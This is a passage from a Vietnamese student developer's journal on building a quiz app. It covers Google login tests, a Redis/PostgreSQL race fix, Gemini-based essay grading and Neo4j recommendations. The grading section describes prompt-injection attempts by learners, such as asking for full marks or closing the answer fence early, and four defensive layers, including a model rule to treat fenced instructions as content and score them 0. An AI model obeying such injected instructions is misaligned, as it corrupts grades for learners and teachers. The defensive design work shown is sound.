vì để nó ném lỗi khó hiểu, trả **400** kèm hướng dẫn dùng **Quên mật khẩu** để đặt mật khẩu đầu tiên
— đường đó chạy được vì OTP gửi về đúng hòm thư Google đã xác minh.

### Cách kiểm thử phần không kiểm thử được

Không có cách tạo ID token do Google ký thật trong test, mà test cũng không được phụ thuộc mạng ngoài.
Nên `GoogleTokenVerifier` được thay bằng mock: phần *xác minh chữ ký* tin vào thư viện chính chủ, còn
6 ca test lo **nghiệp vụ sau khi đã xác minh** — tạo mới, liên kết vào tài khoản sẵn có (giữ nguyên
mật khẩu và tên hiển thị cũ), đăng nhập lần hai không tạo trùng, token hỏng trả 401, thiếu `idToken`
trả 400, và tài khoản chỉ-Google đổi mật khẩu nhận đúng thông báo hướng dẫn.

Ranh giới này cần nói rõ trong báo cáo: test **không** chứng minh chữ ký được kiểm đúng.

### Chạy hồi quy đầy đủ moi ra một lỗi đua không liên quan gì tới Google

Bộ kiểm chứng phòng đấu báo hỏng đúng một ca: *"ván đã kết thúc thì không vào được nữa"* trả **200**
thay vì 409. Chạy riêng bộ đó thì lại đạt — chỉ hỏng khi chạy sau ba bộ khác, tức là **lỗi phụ thuộc
thời điểm**, không phải logic sai hẳn.

Nguyên nhân: hai nơi lưu trạng thái không đổi cùng lúc.

```
next()  ─┬─ đổi Redis sang FINISHED   (ngay, trong khoá)
         ├─ phát GAME_FINISHED        (ngay ← client nhận được ở đây)
         └─ ghi game_rooms.status     (chỉ có hiệu lực khi giao dịch COMMIT)
                                             ↑
                    join() đọc cột này — nếu chen vào trước commit thì thấy PLAYING
```

Client nhận `GAME_FINISHED` rồi gọi `join` ngay, mà `requireJoinableRoom` lại đọc trạng thái từ
PostgreSQL. Khe hở chỉ vài mili-giây; máy rảnh thì không bao giờ trúng, máy bận thì trúng.

Sửa: `requireJoinableRoom` hỏi **Redis trước, PostgreSQL sau** — Redis là trạng thái sống, đổi ngay
trong khoá; CSDL chỉ là bản lưu. Không còn state ở Redis (hết TTL) mới tin vào CSDL.

Đáng nói hai điều. Thứ nhất, đây là **lỗi thứ tư cùng một họ** trong đồ án: `@Async` chạy trước
commit, `@TransactionalEventListener`, self-invocation mất `@Transactional`, và giờ là đọc trước
commit — đều là *"việc A tưởng đã xong nhưng thật ra chưa"*. Thứ hai, nó chỉ lộ ra khi chạy **toàn
bộ** bộ kiểm chứng liên tiếp; chạy lẻ từng bộ sẽ không bao giờ thấy.

Ca test mới dựng thẳng trạng thái lệch (Redis FINISHED, CSDL còn PLAYING) thay vì cố chạy đua cho
thắng — chắc chắn tái hiện được, và nói rõ bất biến cần giữ. Đã kiểm ngược: gỡ bản sửa ra thì ca này
hỏng đúng như mô tả (`expected:<409> but was:<200>`), gắn lại thì đạt.

### Nợ / chuyển sang ngày sau
- ✅ **Đã bấm thử bằng tài khoản Google thật và đăng nhập được** — tạo OAuth Client (Web application)
  trên Google Cloud Console, điền vào `GOOGLE_CLIENT_ID` (backend) và `VITE_GOOGLE_CLIENT_ID`
  (frontend). Sau khi cấu hình, endpoint đổi từ 503 *"chưa cấu hình"* sang 401 *"token không hợp lệ"*
  với token giả — dấu hiệu bộ xác minh đã bật thật.
- **Nút Google không dùng được khi mở qua IP LAN** (đường dùng để quét QR bằng điện thoại): Google
  không nhận IP nội bộ làm *Authorized JavaScript origin*, chỉ nhận `localhost` hoặc tên miền thật.
  Trên điện thoại phải đợi deploy.
- Khi deploy phải thêm tên miền thật vào *Authorized JavaScript origins*, nếu không nút sẽ không hiện.
- Chưa có màn hình "Liên kết/huỷ liên kết tài khoản Google" trong phần hồ sơ.
- Vite 8 báo `optimizeDeps.esbuildOptions` sắp bị bỏ (đổi thành `rolldownOptions`). Shim `global` cho
  `sockjs-client` hiện vẫn ăn — đã kiểm bản pre-bundle, `globalThis` thay đủ chỗ — nhưng phải đổi
  trước khi Vite gỡ hẳn, nếu không phòng đấu sẽ trắng trang trở lại.

### Ghi chú báo cáo
- **Mục 2.3 (bảo mật):** ba lỗ hổng ở trên là ví dụ tốt cho phần phân tích rủi ro — đều là *lỗi do
  thiếu một bước kiểm tra*, không phải lỗi lập trình, nên không có compiler hay test nào tự bắt được.
- **Mục 2.4 (CSDL):** đổi `password_hash` từ NOT NULL sang CHECK ràng buộc kép là ví dụ về việc thêm
  tính năng làm thay đổi bất biến của lược đồ.
- **Mục 3.4 (kiểm thử):** nêu rõ ranh giới mock — cái gì được kiểm, cái gì tin vào thư viện.
- **"Khó khăn & cách giải quyết":** hai điểm — tính năng mới phá luồng cũ (`change-password`), và lỗi
  đua Redis/PostgreSQL chỉ hiện khi chạy hồi quy đầy đủ. Cái sau là lập luận tốt cho việc **vì sao
  phải chạy lại toàn bộ bộ kiểm chứng sau mỗi tính năng**, chứ không chỉ chạy bộ của tính năng vừa làm.

---

## 📅 CN — 09/08/2026 — Lát cắt 6: AI chấm câu tự luận (FR-30)

**Mục tiêu:** Trụ cột AI mới có phần *sinh đề*. Nay bổ sung phần *chấm* — thứ quiz truyền thống
không làm được, và cũng là lý do đề tài này cần AI chứ không chỉ cần một CSDL câu hỏi.

### Nhiệm vụ
- [x] Migration V9: `questions.rubric`, `attempt_answers.ai_suggestions/graded_at`, trạng thái `AI_FAILED`
- [x] `GradingPromptBuilder` + `GradeJsonParser` — dựng prompt theo rubric, kiểm duyệt đầu ra
- [x] Chấm nền sau khi nộp: `@TransactionalEventListener(AFTER_COMMIT)` + `@Async`
- [x] API giải thích đáp án + Creator chấm tay ghi đè
- [x] Frontend: ô rubric, màn kết quả hiện nhận xét, tự cập nhật khi chấm xong
- [x] Test **217/217** JUnit (thêm 57 ca) + **kiểm chứng chấm thật bằng Gemini** 31/31 + hồi quy 176/176 (bộ không dùng AI)
- [x] Vá hạn mức 429 phát hiện lúc chạy thật

### Vì sao chấm nền chứ không chấm ngay lúc nộp

Mỗi câu tự luận là một lời gọi mô hình mất vài giây. Bài 5 câu tự luận chấm đồng bộ bắt người học
ngồi nhìn màn hình quay nửa phút, và request nào cũng có thể timeout giữa chừng để lại bài nộp dở.

```
submit()  ──> chấm trắc nghiệm bằng logic  ──> trả kết quả NGAY (điểm tạm)
              └─ phát sự kiện ─ AFTER_COMMIT ─> chấm nền ─> cộng lại tổng điểm
```

`gradingPending` cho frontend biết còn bao nhiêu câu đang chấm để hỏi lại mỗi 3 giây rồi **dừng
hẳn**. Người học thấy điểm phần trắc nghiệm ngay, phần tự luận tự nhảy vào sau.

Hai chi tiết bắt buộc, đều là bẫy đã vấp ở lát cắt AI trước nên lần này làm đúng ngay: pha
`AFTER_COMMIT` (khởi động luồng nền sớm hơn thì nó đọc CSDL trước lúc commit, không thấy câu nào),
và lớp ghi là **bean riêng** với `REQUIRES_NEW` (gọi `this.method()` trong cùng lớp không qua proxy
Spring nên `@Transactional` mất tác dụng).

### Ba thứ không được tin ở đầu ra mô hình

`GradeJsonParser` là chỗ duy nhất đứng giữa đầu ra tuỳ hứng của mô hình và **điểm số ghi vào bài của
người học**, nên không có chỗ cho "chắc mô hình trả đúng".

| Vấn đề thật gặp | Xử lý |
|---|---|
| Trả 100 điểm cho câu tối đa 5 điểm; hoặc điểm âm | Ép về `[0, max_score]` |
| Không trả `score` | Ném lỗi → câu vào `AI_FAILED`, chờ chấm tay. Ghi con số bịa còn tệ hơn báo hỏng |
| `isCorrect: true` kèm điểm 3/10 | Điểm là nguồn sự thật, cờ đúng/sai suy lại từ điểm |

### Prompt injection — bề mặt tấn công lớn nhất từ trước tới nay

Đây là tính năng **duy nhất** mà người học tự gõ nội dung rồi nội dung đó đi thẳng vào prompt. Học
liệu ở lát cắt trước dù sao cũng do Creator nạp; bài làm thì ai cũng viết được gì tuỳ ý.

Bốn lớp, lớp cuối là quan trọng nhất:

1. Bài làm rào trong khối `<<<BAI_LAM_CUA_HOC_SINH>>> … <<<HET_BAI_LAM>>>`.
2. Chỉ dẫn hệ thống nói thẳng: câu lệnh bên trong khối đó là *nội dung cần chấm*; bài chỉ chứa
   những câu như vậy thì cho **0 điểm**.
3. Người học tự gõ đúng chuỗi rào thì chuỗi đó bị vô hiệu hoá — không xử lý thì họ tự "đóng" khối
   dữ liệu rồi viết chỉ thị ở bên ngoài.
4. **Ép điểm về trần.** Dù ba lớp trên thủng hết và mô hình nghe lời "cho tôi 100 điểm", điểm vẫn
   không vượt được trần thật của câu.

Ba lớp đầu là *thuyết phục* mô hình — mà mô hình thì không có gì bảo đảm. Lớp thứ tư là **ràng buộc
bằng code**, và đó mới là thứ chứng minh được. Điểm này đáng nhấn trong báo cáo: phòng thủ trước LLM
không thể chỉ dựa vào prompt.

Đo thật với Gemini: cả ba kiểu tấn công đều nhận **0/10**.

### Chạy thật lộ ra chuyện test không bao giờ thấy: hạn mức 5 lượt/phút

Bộ kiểm chứng chạy tới phần cuối thì `explain` trả **503**. Không phải lỗi logic — Gemini bản miễn
phí cho **5 request mỗi phút**, và thông báo lỗi ghi rõ *"Please retry in 52s"*.

Vấn đề thật nằm chỗ khác: backoff của `AiOrchestrator` là 1,2s rồi 2,4s — tổng ~3,6 giây. Với cửa sổ
hạn mức tính theo **phút** thì thử lại sớm chỉ tốn thêm một lượt gọi rồi lại 429. Nghĩa là **chấm
một bài từ câu tự luận thứ sáu trở đi sẽ hỏng hết** trên gói miễn phí. Test JUnit không bao giờ thấy
vì ở đó mô hình bị mock.

Sửa ba lớp:

1. **Đọc con số chính Gemini đưa ra** trong thân lỗi (`"Please retry in 52.03s"` hoặc
   `retryDelay: "52s"`) và chờ đúng ngần ấy, thay vì backoff tự nghĩ.
2. **Trần chờ do bên gọi quyết định** — 5 giây cho request đồng bộ (chờ lâu hơn thì người dùng tưởng
   treo), 75 giây cho tác vụ nền (không ai ngồi đợi). Một tham số `background` phân biệt hai đường,
   và mọi lời gọi từ job nền — chấm bài, sinh đề, sinh embedding khi nạp học liệu — đều dùng nó.
3. **Hết hạn mức trả 429 kèm số giây, không phải 503 "không phản hồi".** Hai chuyện này người dùng
   xử lý khác nhau: hết hạn mức thì chờ một phút là chạy lại được, còn 503 khiến họ tưởng hệ thống
   hỏng và bỏ luôn. Nay thông điệp là *"Vui lòng thử lại sau khoảng 51 giây."*

Đây cũng là lý do bộ kiểm chứng cho phép hai kết cục ở phần giải thích: chấm được (200) hoặc báo
đúng thời gian chờ (429). Cái bị coi là sai là một lỗi mơ hồ.

> Bài học chung: **hạn mức của nhà cung cấp là một phần của thiết kế, không phải chi tiết vận hành.**
> Cùng một đoạn code chạy tốt với 1 câu tự luận và hỏng hoàn toàn với 10 câu.

### Hai lỗi do chính mình vừa tạo ra, bắt được nhờ chạy lại toàn bộ

1. **Thêm overload làm mock cũ thành vô hiệu.** `complete()` có thêm bản 4 tham số; trên bean thật
   bản 3 tham số gọi xuống bản 4, nhưng trên **mock** hai bản hoàn toàn độc lập — stub bản cũ, gọi
   bản mới thì Mockito trả `null`. Bốn ca test chuyển từ đạt sang hỏng mà không dòng nghiệp vụ nào
   sai. Đáng nhớ: *thêm overload là thay đổi phá vỡ đối với mọi test đang mock hàm đó.*
2. **Build tăng dần giấu lỗi biên dịch.** `mvn compile` báo thành công trong khi `target/classes`
   vẫn còn class hỏng do IDE ghi đè giữa chừng; ứng dụng chạy lên bình thường rồi ném
   `java.lang.Error: Unresolved compilation problems` **chỉ ở luồng nền**, nên API vẫn 200 và mọi
   câu tự luận âm thầm rơi vào `AI_FAILED`. Phải `mvn clean compile` mới lộ. Bài học: lỗi ở luồng
   nền không làm request nào đỏ lên — chỉ nhìn mã trạng thái thì không thấy gì.

### Dọn dẹp kèm theo
Tách `AiJson` dùng chung cho cả lớp đọc JSON sinh đề lẫn lớp đọc JSON chấm điểm — cả hai đều phải gỡ
khối ```` ```json ```` và chấp nhận nhiều tên trường khác nhau, không có lý do chép lại hai lần.

Bộ kiểm chứng đường LAN trước đây viết cứng IP `192.168.0.101`; máy đổi sang `.102` là báo hỏng dù
code không đổi gì. Nay nó **hỏi backend** địa chỉ đó qua `joinUrl` của một phòng tạo thử — cũng đúng
tinh thần "backend là nơi quyết định URL trong mã QR" đã chốt ở lát cắt trước.

### Kết quả kiểm thử

| Loại | Kết quả |
|---|---|
| JUnit | **217/217** (thêm 57 ca: 14 parser, 7 dựng prompt, 17 tích hợp chấm, 12 tích hợp sinh đề, 7 đọc gợi ý chờ 429) |
| Bộ chấm tự luận với **Gemini thật** | **31/31** |
| Hồi quy các bộ không dùng AI (9 bộ) | **176/176** |
| Bộ AI + RAG sinh đề (22 ca) | ⏸ **chưa chạy lại được** — cạn hạn mức Gemini trong ngày |

Kết quả chấm thật đáng ghi lại: bài trả lời đầy đủ ba nguyên nhân được **10/10**, bài "Tại mạng chậm
thôi" được **0/10**, và cả ba kiểu prompt injection đều **0/10** — mô hình gọi đúng tên chúng là
"không trả lời vào câu hỏi".

**Về mục ⏸:** hôm nay đã gọi Gemini hơn một trăm lượt để dựng và đo tính năng này, nên hạn mức ngày
của gói miễn phí cạn (thông báo đổi từ `limit: 5` sang `limit: 20`). Bộ AI + RAG **không sửa gì
trong lát cắt này** ngoài việc thêm `background = true` cho lời gọi sinh đề và embedding — thay đổi
chỉ khiến job kiên nhẫn hơn, không đổi kết quả. Chạy lại khi hạn mức hồi (sang ngày) để chốt con số.
Ghi rõ ở đây thay vì báo một tổng đẹp là vì đúng tinh thần *"số liệu chỉ ghi khi đã đo thật"*.

### Nợ / chuyển sang ngày sau
- Giải thích **không được lưu** — mỗi lần bấm là một lời gọi mô hình mới.
- Chưa có màn hình cho Creator duyệt danh sách bài cần chấm tay; API đã có, giao diện chờ features/09.
- Chưa giới hạn hạn mức chấm theo người dùng — một người nộp liên tục sẽ ăn hết quota của cả hệ thống.
- Chưa đo **độ chính xác** chấm so với người chấm (số liệu mục 3.6) — cần bộ bài mẫu có đáp án
  người chấm sẵn, chưa dựng.
- Chatbot RAG (features/08) là phần còn lại của tuần 6, chưa làm.
- **Chạy lại bộ AI + RAG sinh đề** khi hạn mức Gemini hồi (`bash run_all.sh`, bỏ `SKIP_AI=1`) — giờ
  chỉ còn để đo *chất lượng câu hỏi* với mô hình thật; phần *luồng* đã có test tự động.
- Gói miễn phí không đủ cho một lượt hồi quy đầy đủ có hai bộ AI. Nếu cần số liệu mục 3.5/3.6 đầy đủ
  thì phải nâng gói, hoặc chạy hai bộ AI vào hai ngày khác nhau.

### Ghi chú báo cáo
- **Mục 2.3 (bảo mật):** bốn lớp chống prompt injection, đặc biệt luận điểm "ba lớp đầu là thuyết
  phục mô hình, lớp thứ tư là ràng buộc bằng code" — dùng được nguyên văn.
- **Mục 2.5 (thiết kế):** sơ đồ chấm nền ở trên; nhấn vào việc **tổng điểm phải cộng lại** sau khi
  chấm xong, vì điểm ngay sau khi nộp chỉ là điểm tạm.
- **Mục 3.4 (kiểm thử):** nói rõ ranh giới — JUnit mock mô hình để kiểm *cơ chế*, kiểm chứng tay với
  Gemini thật để xem *chất lượng chấm*. Hai việc khác nhau, không thay thế nhau được.
- **Mục 3.6 (độ chính xác AI):** đã có dữ liệu định tính (bài đầy đủ 10/10, bài sơ sài 0/10, tấn công
  0/10). Số liệu định lượng còn nợ.
- **"Khó khăn & cách giải quyết":** hạn mức 5 lượt/phút là ví dụ rất tốt — lỗi chỉ hiện khi chạy
  thật, không test nào bắt được, và cách sửa phải đi vào thiết kế chứ không phải tăng số lần thử lại.

---

## 📅 CN — 09/08/2026 (chiều) — Lọc câu hỏi theo chủ đề

**Mục tiêu:** Người dùng phản ánh: *"muốn làm quiz Lịch sử thì phải lọc hết trong ngân hàng xem đâu
là câu về lịch sử"*. Kiểm lại thì tình trạng còn tệ hơn mô tả.

### Hiện trạng trước khi sửa

| Chỗ | Lọc theo chủ đề |
|---|---|
| Backend `GET /questions?topic=` | ✅ **đã có sẵn từ lát cắt 2** |
| Trang Ngân hàng câu hỏi | ❌ chỉ có Loại + Độ khó |
| **Hộp chọn câu khi soạn quiz** | ❌ **không có bộ lọc nào cả** — lật từng trang 8 câu |

Chỗ thứ ba mới là chỗ đau nhất, và cũng là chỗ dễ bỏ sót nhất khi tự kiểm: trang ngân hàng ít nhất
còn có *hai* bộ lọc nên nhìn qua tưởng ổn, còn hộp chọn câu thì trần trụi mà không ai để ý vì nó nằm
trong một modal.

Đáng nói: **backend đã làm được việc này từ lâu, chỉ là giao diện không cho gọi.** Một tính năng có
mà không dùng được thì với người dùng nó chính là không có.

### Chủ đề: cột chữ tự do hay bảng riêng?

Cân nhắc hai hướng và chọn hướng nhẹ:

| | Bảng `topics` riêng | **Cột chữ + gợi ý (đã chọn)** |
|---|---|---|
| Soạn câu đầu tiên | Phải đi tạo chủ đề trước | Gõ thẳng |
| Dữ liệu cũ | Cần migration chuyển đổi | Dùng được ngay |
| Đổi tên chủ đề | Sửa một chỗ, mọi câu đổi theo | Phải sửa từng câu |
| Chống trôi chính tả | Chặt bằng khoá ngoại | Bằng gợi ý lúc gõ |

Chọn cột chữ vì hai dòng đầu quan trọng hơn hai dòng sau ở giai đoạn này: bắt người dùng dựng danh
mục trước khi viết được câu hỏi đầu tiên là thêm rào cản cho việc họ vốn muốn làm nhanh. Đổi lại
phải trả giá ở chỗ "Lịch sử Việt Nam" và "Lịch sử VN" thành hai chủ đề — nên ô Chủ đề lúc soạn câu
đổi thành **gõ-hoặc-chọn**, xổ sẵn những chủ đề đã dùng kèm số câu. Nâng lên bảng riêng sau này
không vỡ gì, vì cột vẫn ở nguyên đó.

### Đã làm
- `GET /questions/topics` — chủ đề của tôi kèm số câu, sắp theo bảng chữ cái không phân biệt hoa/thường.
- Bộ lọc chủ đề ở trang Ngân hàng câu hỏi.
- Hộp chọn câu lúc soạn quiz: thêm **tìm kiếm + chủ đề + độ khó** (trước đó không có gì).
- Ô Chủ đề đổi thành gõ-hoặc-chọn.

Hai chi tiết cố ý: lọc chạy **ở truy vấn** chứ không lọc sau khi tải (mỗi lần chỉ lấy 8 câu, lọc phía
client thì chỉ lọc trong 8 câu đó — gần như vô dụng), và đổi bộ lọc thì **về trang đầu**, nếu không
sẽ rơi vào trang trống của kết quả mới.

Số câu hiện kèm mỗi chủ đề *(Lịch sử Việt Nam (12))* — không phải để trang trí: nó trả lời ngay câu
"chủ đề nào đủ câu để dựng một quiz".

### Kiểm thử
**222/222** JUnit (thêm 5 ca: liệt kê chủ đề kèm số câu, không lộ chủ đề giữa các tài khoản, lọc
không phân biệt hoa/thường, Guest bị chặn, và `/topics` không bị nuốt bởi `/{id}`).

### Ghi chú báo cáo
- **Mục 2.6 (use case):** bổ sung luồng "dựng quiz theo môn từ ngân hàng" — trước đây spec có nhắc
  `topic` nhưng không mô tả người dùng dùng nó thế nào.
- **"Khó khăn & cách giải quyết":** ví dụ tốt cho việc *tính năng có ở backend mà giao diện không
  gọi thì coi như không có*. Cũng là lý do nên tự đóng vai người dùng thử một tác vụ trọn vẹn
  ("làm một quiz Lịch sử") thay vì chỉ kiểm từng endpoint.

---

## 📅 CN — 09/08/2026 (tối) — Lát cắt 7: Gợi ý quiz bằng Neo4j

**Mục tiêu:** Trụ cột MVP thứ tư, và là trụ cột duy nhất còn trống. Neo4j từ đầu đồ án tới giờ mới
chỉ có kết nối — một CSDL đồ thị chạy trong docker-compose mà không làm gì thì rất khó bảo vệ.

### Nhiệm vụ
- [x] Mô hình đồ thị User–Topic–Quiz từ hành vi thật
- [x] Job đồng bộ PostgreSQL → Neo4j, idempotent
- [x] Cypher: gợi ý theo chủ đề yếu + lọc cộng tác
- [x] Cypher: lộ trình học theo năng lực
- [x] API `/recommendations`, `/path`, `/rebuild`
- [x] Frontend: khu "Gợi ý cho bạn" + trang Lộ trình học
- [x] 16 ca test với **Neo4j thật** (Testcontainer), tổng **238/238**

### Việc đầu tiên phải làm là bỏ bớt bản thiết kế

Spec viết từ đầu đồ án có hai thứ **không có nguồn dữ liệu**:

| Trong spec | Vấn đề |
|---|---|
| `q.rating` để sắp xếp gợi ý | Chưa có tính năng đánh giá quiz. Sắp theo một con số không tồn tại thì thứ tự là ngẫu nhiên nhưng *trông có vẻ có căn cứ* — tệ hơn là không sắp |
| `(Topic)-[:PREREQUISITE_OF]->(Topic)` | Không ai khai báo "Vòng lặp phải học trước Mảng". Tự sinh quan hệ tiên quyết là hệ thống bịa ra kiến thức sư phạm nó không có |

Thay bằng: sắp theo **số câu của quiz khớp chủ đề đang yếu** rồi tới **số lượt làm thật**; và lộ
trình xếp theo **mức độ yếu đo được**. Vẫn là gợi ý cá nhân hoá, chỉ là thành thật về căn cứ. Đã sửa
cả `features/07` lẫn `database.md` cho khớp code, đúng quy trình "tài liệu là nguồn sự thật, lệch thì
sửa cả hai".

### Ba quan hệ, không phải bảy

Bản đầu có `ATTEMPTED`, `INTERESTED_IN`, `WEAK_IN`, `BELONGS_TO`, `HAS`, `TESTS`, `PREREQUISITE_OF`,
`SIMILAR_TO`. Rút còn ba:

```
(User)-[:ATTEMPTED {score, maxScore, accuracy, at}]->(Quiz)
(User)-[:PRACTICED {correct, total, accuracy}]->(Topic)
(Quiz)-[:COVERS {questionCount}]->(Topic)
```

Lý do đáng nhớ nhất: **`WEAK_IN` không phải là dữ liệu, nó là một cách diễn giải.** "Yếu" = tỷ lệ
đúng dưới 60%. Nướng ngưỡng đó vào *cạnh* thì mỗi lần chỉnh phải dựng lại toàn bộ đồ thị; để ngưỡng
trong *truy vấn* thì đổi lúc nào cũng được. Cạnh giữ sự thật đo được (đúng 4 trên 10 câu), truy vấn
giữ cách hiểu.

`SIMILAR_TO` cũng bỏ: "người giống tôi" tính ngay trong truy vấn từ những quiz cùng làm. Lưu sẵn thì
phải có job cập nhật, mà nó lỗi thời ngay sau mỗi bài nộp.

### Chỗ đồ thị thắng hẳn bảng quan hệ

Truy vấn lọc cộng tác đi hai bước: *tôi* → *quiz đã làm* → *người khác cũng làm* → *quiz họ còn làm*.
Với SQL đó là hai phép JOIN tự thân trên `quiz_attempts`; với Cypher nó viết đúng như cách nghĩ:

```cypher
MATCH (me:User {id: $userId})-[:ATTEMPTED]->(shared:Quiz)<-[:ATTEMPTED]-(peer:User)
WHERE peer.id <> $userId
WITH peer, count(DISTINCT shared) AS similarity
ORDER BY similarity DESC LIMIT $peerLimit
MATCH (peer)-[:ATTEMPTED]->(q:Quiz)
WHERE NOT (:User {id: $userId})-[:ATTEMPTED]->(q) AND q.visibility = 'PUBLIC'
RETURN q.id, sum(similarity) AS score ORDER BY score DESC
```

Đây là lập luận tốt nhất cho việc *vì sao đồ án cần Neo4j chứ không chỉ cần PostgreSQL* — nên dùng
nguyên đoạn này trong báo cáo.

### Idempotent không phải chuyện lý thuyết

Đồng bộ **cố ý chạy hai lần cho mỗi bài**: một lần lúc nộp, một lần sau khi AI chấm xong câu tự luận
— vì lúc nộp những câu đó còn 0 điểm nên năng lực tính ra sai, người học sẽ bị đánh giá yếu ở chủ đề
họ vừa làm tốt.

Nên toàn bộ dùng `MERGE`, và năng lực **tính lại từ đầu** trên toàn bộ lịch sử chứ không cộng dồn.
Cộng dồn thì đúng chỗ này số liệu nhân đôi. Có một ca test riêng chạy đồng bộ ba lần rồi so số liệu.

Thêm `POST /recommendations/rebuild`: dựng lại đồ thị của một người từ lịch sử. Cần vì hai lẽ — dữ
liệu có *trước* khi tính năng này ra đời không nằm trong đồ thị, và Neo4j là view nên mất dữ liệu
phải dựng lại được. Đó chính là ý nghĩa thực tế của câu "PostgreSQL là nguồn sự thật".

### Neo4j chết không được kéo theo việc nộp bài

Đồng bộ chạy nền và nuốt lỗi; API gợi ý trả danh sách rỗng thay vì 500; tạo ràng buộc lúc khởi động
mà hỏng thì chỉ ghi log chứ không cản ứng dụng lên. Gợi ý là tính năng phụ trợ trên trang chủ —
đánh đổi "Neo4j tắt thì trang chủ sập" là đánh đổi sai.

### Một lỗi test tự gây ra, đáng ghi lại

Ca test đầu assert `count(ATTEMPTED) > 0` trên **toàn đồ thị**. Chạy lẻ thì đạt, chạy cả bộ thì hỏng
— vì con số đó phụ thuộc những ca chạy trước nó, thứ chẳng liên quan gì tới cái đang kiểm. Sửa: mỗi
ca dùng tài khoản riêng và assert đúng cạnh của mình. *Test đếm toàn cục là test phụ thuộc thứ tự
chạy* — mà thứ tự chạy thì không ai kiểm soát.

### Kiểm thử
| Loại | Kết quả |
|---|---|
| JUnit | **238/238** (thêm 16 ca chạy trên **Neo4j thật bằng Testcontainer**) |
| Bộ kiểm chứng gợi ý trên hệ thống thật | **25/25** |
| Hồi quy 10 bộ không dùng AI | **201/201** |
| Hai bộ AI (sinh đề, chấm tự luận) | ⏸ chờ hạn mức Gemini hồi |

Bộ kiểm chứng gợi ý đi qua toàn bộ ngăn xếp thật — HTTP, JWT, Neo4j của docker-compose — nên bắt
được thứ Testcontainer không thấy: sai cấu hình kết nối, endpoint không lọt SecurityConfig, hay đồng
bộ nền không chạy vì thiếu bean. Và nó **không cần hạn mức AI**, vì cả tính năng này là Cypher.

Ghi chú: **238/238** JUnit, thêm 16 ca chạy trên **Neo4j thật bằng Testcontainer** — không mock, vì cả tính
năng này *là* mấy câu Cypher; mock đi thì chỉ còn kiểm được việc gọi hàm, còn Cypher sai cú pháp hay
sai logic đồ thị vẫn lọt.

Ca đáng chú ý: đồng bộ ba lần không nhân đôi; quiz bỏ bớt câu thì cạnh `COVERS` cũ bị gỡ; trả lời
1 câu sai thì **không** bị kết luận yếu; quiz riêng tư của người khác không lọt vào gợi ý; quiz bị
xoá ở PostgreSQL thì nút bị gỡ khỏi đồ thị; và quiz **chưa ai làm** vẫn vào được danh mục.

### Bấm thử xong mới lộ ra hai lỗi thật, và một đống rác do chính mình gây ra

Giao diện chạy, test 234/234, nhưng mở trang Khám phá thì **không có gợi ý nào**. Ba nguyên nhân
xếp chồng:

**1. Đồ thị chỉ được dựng từ hành vi.** Quiz chưa ai làm thì không có nút trong Neo4j, nên không bao
giờ được gợi ý. Mà gợi ý đúng là để giới thiệu quiz người ta *chưa* làm — hệ thống tự loại mất đúng
thứ nó cần đề xuất. Sửa: tách `syncPublicCatalog()` đưa toàn bộ quiz công khai vào đồ thị, độc lập
với việc có ai làm hay không. Việc một quiz phủ chủ đề nào là thuộc tính của chính nó, không phải
hành vi của ai.

**2. Đồng bộ chỉ biết thêm, không biết gỡ.** PostgreSQL còn 1 quiz mà Neo4j vẫn giữ 51 nút. Không
gỡ thì hệ thống sẽ gợi ý một quiz đã bị xoá và người dùng bấm vào nhận 404. Thêm bước gỡ nút không
còn trong CSDL quan hệ — chạy thật gỡ được **58 nút**.

**3. Cơ sở dữ liệu đầy rác test — do chính bộ kiểm chứng của mình.**

| | Trước dọn |
|---|---|
| Tài khoản | 294, trong đó **288 là `@example.com`** |
| Quiz công khai | 204, trong đó **201 do script tạo** |
| Câu hỏi có chủ đề | 36 / 326 |
| Quiz công khai có chủ đề | **3 / 204** |

Mấy ngày qua mỗi lần chạy `run_all.sh` là nó đăng ký tài khoản thật, tạo quiz thật, làm bài thật —
**vào đúng CSDL đang dùng để phát triển**. Trang Khám phá thành một danh sách `Quiz QR gjatd1`,
`Quiz LAN htz9la`, `Dò IP`, `Quiz rỗng`. Gợi ý không có gì để nói vì cả hệ thống chỉ còn ba chủ đề
thật.

Đã sao lưu rồi xoá toàn bộ tài khoản `@example.com` (cascade kéo theo 245 quiz, 310 câu hỏi, 144 bài
làm). Sáu tài khoản thật giữ nguyên. Quan trọng hơn: **thêm bước dọn vào cuối `run_all.sh`** — không
sửa gốc thì tuần sau lại y hệt.

> Bài học: **script kiểm chứng chạy trên hệ thống thật là script ghi dữ liệu thật.** "Chỉ đọc để
> kiểm tra" là ảo tưởng — nó đăng ký, nó tạo, nó nộp bài. Phải dọn ngay trong script, không phải
> nhớ dọn sau.

Một chi tiết nhỏ nhưng đúng như dự đoán: dữ liệu thật đã có sẵn `Mã trạng thái HTTP` (6 câu) và
`mã trạng thái HTTP` (4 câu) — hai chủ đề tách đôi vì khác chữ hoa. Ô gõ-hoặc-chọn làm buổi chiều
ngăn được từ nay, nhưng hai mục đã lỡ tách thì phải sửa tay.

### Bấm thử lần hai: gợi ý vẫn rỗng, và đó là lỗi thiết kế chứ không phải thiếu dữ liệu

Sau khi dọn CSDL và tạo thêm quiz có chủ đề, khu Gợi ý **vẫn trống**. Đọc đồ thị mới hiểu:

| Chủ đề | Người học | Số quiz phủ | Đã làm hết chưa |
|---|---|---|---|
| Spring Boot | 0/15 → yếu | 2 | ✅ cả hai |
| Java | 1/5 → yếu | 1 | ✅ |
| Lập trình web | *chưa làm bao giờ* | 1 | ❌ |

Gợi ý chỉ có hai nguồn — chủ đề yếu, và người giống mình — mà **cả hai cạn cùng lúc**: yếu chỗ nào
thì đã làm hết quiz chỗ đó, còn hệ thống mới có một người dùng hoạt động nên lọc cộng tác cũng rỗng.
Trong khi kho vẫn còn nguyên một quiz "Lập trình web" chưa ai đụng.

Thêm **nguồn thứ ba: chủ đề chưa từng luyện**. Nó cũng giải luôn bài toán *cold start* đã ghi vào nợ
hôm trước — người vừa đăng ký chưa có hành vi nào, nhưng mọi chủ đề đều là mới với họ.

> Bài học: một hệ gợi ý phải có **nguồn không phụ thuộc hành vi** làm đáy. Hai nguồn "thông minh"
> đều cần dữ liệu để chạy, nên chúng hỏng cùng nhau đúng lúc người dùng cần nhất — lúc mới bắt đầu,
> và lúc đã học hết phần mình yếu.

### Bốn lỗi đồng thời, moi ra bởi hai ca test mới

Thêm hai ca test cho nguồn thứ ba thì **ba ca khác đỏ lên** — không phải vì test sai, mà vì chúng
tạo thêm đủ tải để lộ một chuỗi lỗi ghi đồng thời đã nằm sẵn ở đó.

| Triệu chứng | Nguyên nhân thật | Sửa |
|---|---|---|
